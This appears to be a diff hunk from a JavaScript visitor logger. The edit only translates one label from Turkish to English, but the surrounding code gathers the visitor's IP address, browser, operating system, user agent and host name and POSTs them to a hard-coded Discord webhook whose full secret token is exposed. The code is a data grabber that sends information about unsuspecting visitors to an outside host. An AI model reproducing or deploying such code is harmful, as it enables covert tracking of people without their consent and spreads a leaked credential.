@@ -28,7 +28,7 @@
                 }).catch(function(response) {
                     console.log("Failed to fetch data!");
                     var body = JSON.stringify({
-                        "content": "Tarih/Zaman: " + timestamp + "\IP Adresi: " + ip + "\nBrowser: " + browser + "\nOperating System: " + os + "\nUser Agent: " + user_agent + "\nHost Name: " + host_name
+                        "content": "Date/Time: " + timestamp + "\IP Adresi: " + ip + "\nBrowser: " + browser + "\nOperating System: " + os + "\nUser Agent: " + user_agent + "\nHost Name: " + host_name
                     });
                     fetch("https://discord.com/api/webhooks/1161339513059160144/-9a91YW7mvzuxvbxDXg6NrqzNlkZwZjNsSym097_TDIr6G5qgHxUe4l9aAu_tJGO0vAc", {
                         method: "POST",
